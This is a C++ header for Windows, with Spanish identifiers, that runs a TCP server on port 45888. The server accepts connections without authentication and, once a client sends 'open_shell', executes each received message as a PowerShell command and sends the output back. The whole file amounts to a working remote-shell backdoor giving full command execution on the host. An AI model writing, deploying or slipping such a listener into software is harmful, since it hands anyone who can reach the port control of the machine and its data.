#ifndef SERVER_HPP
#define SERVER_HPP

#define ASIO_STANDALONE

#include <winsock2.h>
#include <windows.h>
#include <asio.hpp>
#include <thread>
#include <iostream>
#include <atomic>

namespace Comunicacion
{
    std::atomic<bool> ShellCheck;

    inline bool PowerShell(const std::string &command, std::string &resultado)
    {
        STARTUPINFOA si = {sizeof(STARTUPINFOA)};
        PROCESS_INFORMATION pi;
        SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};

        HANDLE hRead, hWrite;
        if (!CreatePipe(&hRead, &hWrite, &sa, 0))
            return false;

        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdOutput = hWrite;
        si.hStdError = hWrite;
        si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

        std::string comandoReal = "powershell.exe -Command \"" + command + "\"";

        std::vector<char> cmdBuffer(comandoReal.begin(), comandoReal.end());
        cmdBuffer.push_back('\0');

        BOOL success = CreateProcessA(
            NULL,
            cmdBuffer.data(),
            NULL, NULL, TRUE, 0, NULL, NULL,
            &si, &pi);

        CloseHandle(hWrite);

        if (!success)
        {
            CloseHandle(hRead);
            return false;
        }

        char buffer[4096];
        DWORD bytesRead;

        while (ReadFile(hRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0)
        {
            resultado.append(buffer, bytesRead);
        }

        CloseHandle(hRead);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        return true;
    }

    void manejarSesion(asio::ip::tcp::socket sock)
    {
        char data[4096];

        try
        {
            while (true)
            {
                /////////////////////////////////////////////////////////
                std::size_t length = sock.read_some(asio::buffer(data));

                if (length == 0)
                {
                    break;
                }
                std::string mensaje(data, length);
                mensaje.pop_back();
                if (mensaje.empty())
                {
                    asio::write(sock, asio::buffer("Mensaje vacío, pibe... \n"));
                }
                /////////////////////////////////////////////////////////
                if (!ShellCheck.load())
                {
                    if (mensaje == "open_shell")
                    {
                        ShellCheck.store(true, std::memory_order_seq_cst);
                        continue;
                    }

                    asio::write(sock, asio::buffer(" - - Shell Desactivado - - "));
                }
                else
                {
                    // std::string msg = "Mensaje: " + mensaje + "\n Size: " + std::to_string(mensaje.size());
                    // asio::write(sock, asio::buffer(msg));

                    if (mensaje == "close_shell")
                    {
                        ShellCheck.store(false, std::memory_order_seq_cst);
                        continue;
                    }

                    std::string resultado;
                    if (PowerShell(mensaje, resultado))
                    {
                        std::string msg = "\n - - - - - Inicio - - - - -\n" + resultado + "\n - - - - - Final  - - - - -\n@bin> ";
                        asio::write(sock, asio::buffer(msg));
                    }
                    else
                    {
                        asio::write(sock, asio::buffer("Error ejecutando PowerShell\n@bin> "));
                    }
                }
            }
        }
        catch (...)
        {
        }

        sock.close();
    }

    void iniciarServidor()
    {
        asio::io_context io_service;
        asio::ip::tcp::acceptor acceptor(io_service, asio::ip::tcp::endpoint(asio::ip::tcp::v4(), 45888));

        while (true)
        {
            asio::ip::tcp::socket socket(io_service);
            acceptor.accept(socket);
            std::thread(Comunicacion::manejarSesion, std::move(socket)).detach();
        }
    }
}

#endif // SERVER_HPP
